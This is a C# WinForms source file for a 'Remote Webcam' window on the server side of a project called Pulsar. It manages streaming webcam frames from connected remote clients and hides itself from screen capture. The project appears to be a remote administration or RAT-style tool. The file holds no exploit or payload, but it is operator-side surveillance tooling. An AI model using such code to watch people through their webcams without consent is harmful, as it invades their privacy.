using Gma.System.MouseKeyHook;
using Pulsar.Common.Messages;
using Pulsar.Server.Forms.DarkMode;
using Pulsar.Server.Helper;
using Pulsar.Server.Messages;
using Pulsar.Server.Networking;
using Pulsar.Server.Utilities;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Windows.Forms;
using Pulsar.Common.Enums;

namespace Pulsar.Server.Forms
{
    public partial class FrmRemoteWebcam : Form
    {
        private readonly System.Windows.Forms.Timer _healthTimer;
        private MediaStreamStatus _streamStatus = MediaStreamStatus.Stopped;
        private DateTime _lastFrameUtc;
        private string _fpsText = string.Empty;

        /// <summary>
        /// The client which can be used for the remote webcam.
        /// </summary>
        private readonly Client _connectClient;

        /// <summary>
        /// The message handler for handling the communication with the client.
        /// </summary>
        private readonly RemoteWebcamHandler _RemoteWebcamHandler;

        /// <summary>
        /// Holds the opened remote webcam form for each client.
        /// </summary>
        private static readonly Dictionary<Client, FrmRemoteWebcam> OpenedForms = new Dictionary<Client, FrmRemoteWebcam>();
        private static readonly object OpenedFormsLock = new object();
        private bool _closing;

        private int _framesForSize = 0;

        /// <summary>
        /// Creates a new remote webcam form for the client or gets the current open form, if there exists one already.
        /// </summary>
        /// <param name="client">The client used for the remote webcam form.</param>
        /// <returns>
        /// Returns a new remote webcam form for the client if there is none currently open, otherwise creates a new one.
        /// </returns>
        public static FrmRemoteWebcam CreateNewOrGetExisting(Client client)
        {
            lock (OpenedFormsLock)
            {
                if (OpenedForms.TryGetValue(client, out FrmRemoteWebcam existing) &&
                    existing != null && !existing.IsDisposed)
                {
                    return existing;
                }

                if (existing != null)
                    OpenedForms.Remove(client);

                FrmRemoteWebcam r = new FrmRemoteWebcam(client);
                r.Disposed += (sender, args) =>
                {
                    lock (OpenedFormsLock)
                    {
                        OpenedForms.Remove(client);
                    }
                };
                OpenedForms.Add(client, r);
                return r;
            }
        }

        /// <summary>
        /// Initializes a new instance of the <see cref="FrmRemoteWebcam"/> class using the given client.
        /// </summary>
        /// <param name="client">The client used for the remote webcam form.</param>
        public FrmRemoteWebcam(Client client)
        {
            _connectClient = client;
            _RemoteWebcamHandler = new RemoteWebcamHandler(client);
            _healthTimer = new System.Windows.Forms.Timer
            {
                Interval = 1000
            };
            _healthTimer.Tick += HealthTimer_Tick;

            RegisterMessageHandler();
            InitializeComponent();

            DarkModeManager.ApplyDarkMode(this);
			ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
        }

        /// <summary>
        /// Called whenever a client disconnects.
        /// </summary>
        /// <param name="client">The client which disconnected.</param>
        /// <param name="connected">True if the client connected, false if disconnected</param>
        private void ClientDisconnected(Client client, bool connected)
        {
            if (!connected)
            {
                if (InvokeRequired)
                {
                    BeginInvoke(new MethodInvoker(ResetForDisconnect));
                    BeginInvoke(new MethodInvoker(Close));
                }
                else
                {
                    ResetForDisconnect();
                    Close();
                }
            }
        }

        private void ResetForDisconnect()
        {
            _healthTimer.Stop();
            _streamStatus = MediaStreamStatus.Stopped;
            _lastFrameUtc = DateTime.MinValue;
            _fpsText = string.Empty;
            sizeLabelCounter.Text = "Size:";
            picWebcam.Stop();
            picWebcam.UnsetFrameUpdatedEvent(frameCounter_FrameUpdated);
            ToggleConfigurationControls(false);
        }

        /// <summary>
        /// Registers the remote webcam message handler for client communication.
        /// </summary>
        private void RegisterMessageHandler()
        {
            _connectClient.ClientState += ClientDisconnected;
            _RemoteWebcamHandler.DisplaysChanged += DisplaysChanged;
            _RemoteWebcamHandler.ProgressChanged += UpdateImage;
            _RemoteWebcamHandler.StreamStatusChanged += StreamStatusChanged;
            MessageHandler.Register(_RemoteWebcamHandler);
        }

        /// <summary>
        /// Unregisters the remote webcam message handler.
        /// </summary>
        private void UnregisterMessageHandler()
        {
            MessageHandler.Unregister(_RemoteWebcamHandler);
            _RemoteWebcamHandler.DisplaysChanged -= DisplaysChanged;
            _RemoteWebcamHandler.ProgressChanged -= UpdateImage;
            _RemoteWebcamHandler.StreamStatusChanged -= StreamStatusChanged;
            _connectClient.ClientState -= ClientDisconnected;
        }

        /// <summary>
        /// Subscribes to local mouse and keyboard events for remote webcam input.
        /// </summary>
        private void SubscribeEvents()
        {
        }

        /// <summary>
        /// Unsubscribes from local mouse and keyboard events.
        /// </summary>
        private void UnsubscribeEvents()
        {
        }

        /// <summary>
        /// Starts the remote webcam stream and begin to receive webcam frames.
        /// </summary>
        private void StartStream()
        {
            _streamStatus = MediaStreamStatus.Starting;
            _lastFrameUtc = DateTime.UtcNow;
            _fpsText = string.Empty;
            UpdateStreamStatusTitle();
            _healthTimer.Start();
            ToggleConfigurationControls(true);

            picWebcam.Start();
            // Subscribe to the new frame counter.
            picWebcam.SetFrameUpdatedEvent(frameCounter_FrameUpdated);

            this.ActiveControl = picWebcam;

            _RemoteWebcamHandler.BeginReceiveFrames(barQuality.Value, cbMonitors.SelectedIndex);
        }

        /// <summary>
        /// Stops the remote desktop stream.
        /// </summary>
        private void StopStream()
        {
            _healthTimer.Stop();
            _streamStatus = MediaStreamStatus.Stopped;
            _lastFrameUtc = DateTime.MinValue;
            _fpsText = string.Empty;
            ToggleConfigurationControls(false);
            UpdateStreamStatusTitle();
            sizeLabelCounter.Text = "Size:";

            picWebcam.Stop();
            // Unsubscribe from the frame counter. It will be re-created when starting again.
            picWebcam.UnsetFrameUpdatedEvent(frameCounter_FrameUpdated);

            this.ActiveControl = picWebcam;

            _RemoteWebcamHandler.EndReceiveFrames();
        }

        /// <summary>
        /// Toggles the activatability of configuration controls in the status/configuration panel.
        /// </summary>
        /// <param name="started">When set to <code>true</code> the configuration controls get enabled, otherwise they get disabled.</param>
        private void ToggleConfigurationControls(bool started)
        {
            btnStart.Enabled = !started;
            btnStop.Enabled = started;
            barQuality.Enabled = !started;
            cbMonitors.Enabled = !started;
        }

        /// <summary>
        /// Toggles the visibility of the status/configuration panel.
        /// </summary>
        /// <param name="visible">Decides if the panel should be visible.</param>
        private void TogglePanelVisibility(bool visible)
        {
            panelTop.Visible = visible;
            btnShow.Visible = !visible;
            this.ActiveControl = picWebcam;
        }

        /// <summary>
        /// Called whenever the remote displays changed.
        /// </summary>
        /// <param name="sender">The message handler which raised the event.</param>
        /// <param name="displays">The currently available displays.</param>
        private void DisplaysChanged(object sender, string[] displays)
        {
            if (displays == null || displays.Length == 0)
            {
                MessageBox.Show("No remote display detected.\nPlease wait till the client sends a list with available displays.",
                    "Display change failed", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            cbMonitors.Items.Clear();
            for (int i = 0; i < displays.Length; i++)
                cbMonitors.Items.Add($"Display {displays[i]}");
            cbMonitors.SelectedIndex = 0;
        }

        private void StreamStatusChanged(object sender,
            RemoteWebcamHandler.MediaStreamStatusEventArgs args)
        {
            if (_closing || IsDisposed)
                return;

            if (InvokeRequired)
            {
                BeginInvoke(new Action(() => ApplyStreamStatus(args)));
            }
            else
            {
                ApplyStreamStatus(args);
            }
        }

        private void ApplyStreamStatus(RemoteWebcamHandler.MediaStreamStatusEventArgs args)
        {
            _streamStatus = args.Status;

            switch (args.Status)
            {
                case MediaStreamStatus.Active:
                    _lastFrameUtc = DateTime.UtcNow;
                    btnStart.Enabled = false;
                    btnStop.Enabled = true;
                    barQuality.Enabled = false;
                    cbMonitors.Enabled = false;
                    _healthTimer.Start();
                    break;

                case MediaStreamStatus.Starting:
                    _lastFrameUtc = DateTime.UtcNow;
                    btnStart.Enabled = false;
                    btnStop.Enabled = true;
                    barQuality.Enabled = false;
                    cbMonitors.Enabled = false;
                    _healthTimer.Start();
                    break;

                case MediaStreamStatus.Stalled:
                    btnStart.Enabled = false;
                    btnStop.Enabled = true;
                    barQuality.Enabled = false;
                    cbMonitors.Enabled = false;
                    break;

                case MediaStreamStatus.Stopped:
                    _healthTimer.Stop();
                    _lastFrameUtc = DateTime.MinValue;
                    _fpsText = string.Empty;
                    ToggleConfigurationControls(false);
                    picWebcam.Stop();
                    picWebcam.UnsetFrameUpdatedEvent(frameCounter_FrameUpdated);
                    break;

                case MediaStreamStatus.Denied:
                case MediaStreamStatus.Unavailable:
                case MediaStreamStatus.InvalidDevice:
                case MediaStreamStatus.DeviceBusy:
                case MediaStreamStatus.FormatUnsupported:
                case MediaStreamStatus.Error:
                    _healthTimer.Stop();
                    _lastFrameUtc = DateTime.MinValue;
                    _fpsText = string.Empty;
                    ToggleConfigurationControls(false);
                    picWebcam.Stop();
                    picWebcam.UnsetFrameUpdatedEvent(frameCounter_FrameUpdated);
                    break;
            }

            UpdateStreamStatusTitle();

            if (args.Status != MediaStreamStatus.Active &&
                args.Status != MediaStreamStatus.Starting &&
                args.Status != MediaStreamStatus.Stalled &&
                args.Status != MediaStreamStatus.Stopped &&
                !string.IsNullOrWhiteSpace(args.ErrorMessage))
            {
                MessageBox.Show(args.ErrorMessage, "Remote webcam",
                    MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }
        }

        private void UpdateStreamStatusTitle()
        {
            string statusName;
            switch (_streamStatus)
            {
                case MediaStreamStatus.Starting:
                    statusName = "Starting";
                    break;
                case MediaStreamStatus.Active:
                    statusName = "Active";
                    break;
                case MediaStreamStatus.Stalled:
                    statusName = "Stalled";
                    break;
                case MediaStreamStatus.Denied:
                    statusName = "Denied";
                    break;
                case MediaStreamStatus.Error:
                    statusName = "Error";
                    break;
                case MediaStreamStatus.Stopped:
                    statusName = "Stopped";
                    break;
                default:
                    statusName = _streamStatus.ToString();
                    break;
            }

            this.Text = $"{WindowHelper.GetWindowTitle("Remote Webcam", _connectClient)} - {statusName}" +
                (string.IsNullOrEmpty(_fpsText) ? string.Empty : $" - {_fpsText}");
        }

        private void HealthTimer_Tick(object sender, EventArgs e)
        {
            if (_streamStatus == MediaStreamStatus.Stopped)
                return;

            double idleSeconds = _lastFrameUtc == DateTime.MinValue
                ? 0
                : (DateTime.UtcNow - _lastFrameUtc).TotalSeconds;

            if (_streamStatus == MediaStreamStatus.Starting &&
                idleSeconds >= 10)
            {
                _streamStatus = MediaStreamStatus.Stalled;
                btnStart.Enabled = false;
                btnStop.Enabled = true;
                UpdateStreamStatusTitle();
            }
            else if (_streamStatus == MediaStreamStatus.Active &&
                     idleSeconds >= 5)
            {
                _streamStatus = MediaStreamStatus.Stalled;
                btnStart.Enabled = false;
                btnStop.Enabled = true;
                UpdateStreamStatusTitle();
            }
        }

        /// <summary>
        /// Updates the current webcam image by drawing it to the webcam picturebox.
        /// </summary>
        /// <param name="sender">The message handler which raised the event.</param>
        /// <param name="bmp">The new webcam image to draw.</param>
        private void UpdateImage(object sender, Bitmap bmp)
        {
            if (_closing || IsDisposed)
                return;

            if (InvokeRequired)
            {
                BeginInvoke(new Action(() => UpdateImage(sender, bmp)));
                return;
            }

            _lastFrameUtc = DateTime.UtcNow;
            if (_streamStatus == MediaStreamStatus.Stalled ||
                _streamStatus == MediaStreamStatus.Starting)
            {
                ApplyStreamStatus(new RemoteWebcamHandler.MediaStreamStatusEventArgs(
                    MediaStreamStatus.Active, null, null));
            }
            _framesForSize++;
            if (_framesForSize >= 60)
            {
                _framesForSize = 0;
                long last = _RemoteWebcamHandler.LastFrameSizeBytes;
                double avg = _RemoteWebcamHandler.AverageFrameSizeBytes;
                double lastKB = last / 1024.0;
                double avgKB = avg / 1024.0;
                this.Invoke((MethodInvoker)delegate
                {
                    sizeLabelCounter.Text = $"{avgKB:0.0} KB";
                });
            }
            picWebcam.UpdateImage(bmp, false);
        }

        private void FrmRemoteWebcam_Load(object sender, EventArgs e)
        {
            this.Text = WindowHelper.GetWindowTitle("Remote Webcam", _connectClient);
            _streamStatus = MediaStreamStatus.Stopped;
            UpdateStreamStatusTitle();

            OnResize(EventArgs.Empty); // trigger resize event to align controls 

            _RemoteWebcamHandler.RefreshDisplays();
        }
        
        /// <summary>
        /// Updates the title with the current frames per second.
        /// </summary>
        /// <param name="e">The new frames per second.</param>
        private void frameCounter_FrameUpdated(FrameUpdatedEventArgs e)
        {
            float fpsToShow = _RemoteWebcamHandler.CurrentFps > 0 ? _RemoteWebcamHandler.CurrentFps : e.CurrentFramesPerSecond;
            _fpsText = $"FPS: {fpsToShow:0.00}";
            UpdateStreamStatusTitle();
        }

        private void FrmRemoteWebcam_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (_closing)
                return;
            _closing = true;

            // all cleanup logic goes here
            UnsubscribeEvents();
            _healthTimer.Stop();
            if (_RemoteWebcamHandler.IsStarted) StopStream();
            UnregisterMessageHandler();
            _RemoteWebcamHandler.Dispose();
            _healthTimer.Dispose();
            picWebcam.GetImageSafe?.Dispose();
            picWebcam.GetImageSafe = null;
        }

        private void FrmRemoteWebcam_Resize(object sender, EventArgs e)
        {
            if (WindowState == FormWindowState.Minimized)
                return;

            _RemoteWebcamHandler.LocalResolution = picWebcam.Size;
            btnShow.Left = (this.Width - btnShow.Width) / 2;
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            if (cbMonitors.Items.Count == 0)
            {
                MessageBox.Show("No remote display detected.\nPlease wait till the client sends a list with available displays.",
                    "Starting failed", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            SubscribeEvents();
            StartStream();
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            UnsubscribeEvents();
            StopStream();
        }

        #region Remote Desktop Configuration

        private void barQuality_Scroll(object sender, EventArgs e)
        {
            int value = barQuality.Value;
            lblQualityShow.Text = value.ToString();

            if (value < 25)
                lblQualityShow.Text += " (low)";
            else if (value >= 85)
                lblQualityShow.Text += " (best)";
            else if (value >= 75)
                lblQualityShow.Text += " (high)";
            else if (value >= 25)
                lblQualityShow.Text += " (mid)";

            this.ActiveControl = picWebcam;
        }

        #endregion

        private void btnHide_Click(object sender, EventArgs e)
        {
            TogglePanelVisibility(false);
        }

        private void btnShow_Click(object sender, EventArgs e)
        {
            TogglePanelVisibility(true);
        }
    }
}
